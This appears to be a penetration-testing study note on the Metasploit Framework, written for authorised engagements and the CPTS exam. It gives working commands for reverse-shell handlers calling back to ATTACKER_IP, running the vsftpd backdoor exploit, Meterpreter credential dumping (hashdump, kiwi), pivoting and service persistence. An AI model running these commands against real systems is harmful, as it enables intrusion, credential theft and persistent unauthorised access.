---
tool: Metasploit Framework
slug: metasploit
stages: [exploitation]
category: Exploitation framework
platforms: [linux, windows, network]
services: [smb, http, https, rdp, ftp]
ports: [21, 80, 443, 445, 3389]
tags: [exploitation, meterpreter, handler, post-exploitation, pivoting, persistence]
attack: [T1203, T1210, T1059, T1055, T1003, T1021]
summary: The exploitation framework: a searchable library of exploits and payloads, the multi/handler that catches shells, Meterpreter for post-exploitation, and routing for pivoting. The hub that ties weaponisation, exploitation and C2 together.
references:
  - Metasploit documentation | https://docs.metasploit.com/
  - Meterpreter | https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html
  - Post-exploitation modules | https://docs.metasploit.com/docs/using-metasploit/intermediate/running-private-modules.html
---

## When to reach for it

There is a known, matched vulnerability to exploit, or you need a reliable listener and post-exploitation shell. Metasploit runs the exploit, catches the callback, and gives you Meterpreter for the stage that follows. Also the easiest `multi/handler` for payloads you built with msfvenom. Once you have a session, it carries the whole post-exploitation chain: enumerate, escalate, harvest credentials, pivot.

## Key flags

Inside `msfconsole`:

- `search <term>`: find a module (by CVE, product, name). Narrow with `search type:exploit platform:windows name:smb`.
- `use <module>`: select it; `info` shows what it does, `options` its settings.
- `show options` / `set OPT value` / `setg OPT value`: module settings; `setg` sets a global kept across modules (`RHOSTS`, `LHOST`).
- `set payload <payload>`: choose the payload; `show payloads` lists what fits.
- `check`: test whether the target is vulnerable without firing.
- `run` / `exploit`: launch; `-j` backgrounds it as a job, `-z` does not auto-interact.
- `sessions -l` / `sessions -i N`: list and interact with shells; `sessions -u N` upgrades a shell to Meterpreter.

## Payloads: staged vs stageless

The payload must match the handler exactly, or the shell never lands.

- Staged (`windows/x64/meterpreter/reverse_tcp`): a small stager pulls the rest over the connection. Smaller on disk; needs `multi/handler` running first.
- Stageless (`windows/x64/meterpreter_reverse_tcp`, note the underscore): the whole payload in one. More robust across flaky links and some AV, larger.
- `reverse_tcp` dials back to you (good through NAT); `bind_tcp` listens on the target (needs a reachable port); `reverse_https` blends with web traffic and survives proxies.

## Meterpreter: core post-exploitation

```text
meterpreter > getuid                 # who am I running as
meterpreter > sysinfo                # OS, arch, domain
meterpreter > getprivs               # enabled privileges
meterpreter > ps                     # process list (note a user-context PID to migrate into)
meterpreter > migrate -N explorer.exe  # move into a stable, same-arch process
meterpreter > pgrep lsass.exe        # find a PID by name
meterpreter > shell                  # drop to a native cmd/powershell
meterpreter > background             # keep the session, return to msf
```

Files, screen and keys:

```text
meterpreter > ls / cd / cat / download / upload
meterpreter > search -f *.kdbx -d C:\\Users   # hunt for interesting files
meterpreter > screenshot
meterpreter > idletime               # is someone at the keyboard
```

## Privilege escalation

```text
meterpreter > getsystem              # try the built-in SYSTEM techniques
meterpreter > run post/multi/recon/local_exploit_suggester   # map the box to local exploits
msf6 > use exploit/windows/local/<suggested>
msf6 > set SESSION 1
msf6 > run
```

On Windows, `getsystem` leans on named-pipe and token tricks; if it fails, the local exploit suggester points at a kernel or service exploit you load as a `windows/local` module against the existing `SESSION`.

## Credentials

```text
meterpreter > hashdump               # local SAM hashes
meterpreter > load kiwi              # in-memory Mimikatz
meterpreter > creds_all              # logon passwords, tickets, hashes from LSASS
meterpreter > lsa_dump_secrets       # LSA secrets (service accounts, cached creds)
```

Hashes feed straight into cracking (`hashcat`) or a pass-the-hash with `impacket`/`netexec`. Treat harvested credentials as in-scope loot only; record where each came from.

## Pivoting

Turn a session into a route so your other tools reach the second network:

```text
meterpreter > run autoroute -s 172.16.5.0/24   # route that subnet through this session
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > run -j                                   # SOCKS5 on 1080 for proxychains
```

Single-port forward (reach one internal service locally):

```text
meterpreter > portfwd add -l 3306 -p 3306 -r 172.16.5.20   # local 3306 -> internal MySQL
```

## Persistence (authorised engagements only)

```text
msf6 > use exploit/windows/local/persistence_service
msf6 > set SESSION 1
msf6 > run
```

Only install persistence when the engagement scope explicitly allows it. Note every mechanism and artefact you drop so it can be removed cleanly at the end.

## Commands

Catch a payload you generated with msfvenom:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 443; run"
```

A typical module run (set the target, payload and listener, then fire):

```text
msf6 > search type:exploit name:vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS HOST
msf6 > check
msf6 > run
```

Upgrade a plain shell (from another tool) to Meterpreter for the post-exploitation toolkit:

```text
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set LHOST ATTACKER_IP
msf6 > set SESSION 1
msf6 > run
```

## Workflow

1. Identify the exact vulnerable product and version from the recon stage.
2. `search` for a matching module; read `info` and prefer modules with a `check`.
3. Set `RHOSTS`, the payload and `LHOST`/`LPORT`; run `check` before `run`.
4. On a session: `getuid`, `sysinfo`, `ps`, then `migrate` into a stable process.
5. Escalate with `getsystem` or the local exploit suggester.
6. Harvest credentials (`hashdump`, `load kiwi`); feed them to cracking or lateral movement.
7. To go deeper, `autoroute` + `socks_proxy` and run your other tools through the pivot.

## Notes

`check` first where the module supports it: some exploits crash the service. Keep payloads matched to the handler (staged vs stageless) and the architecture matched to the target (x64 payload into an x64 process), or `migrate` fails. Metasploit is powerful but loud; for the CPTS exam mindset, understand the manual exploit behind the module so you can reproduce it without the framework. Stay within scope, log every session and artefact, and clean up afterwards.
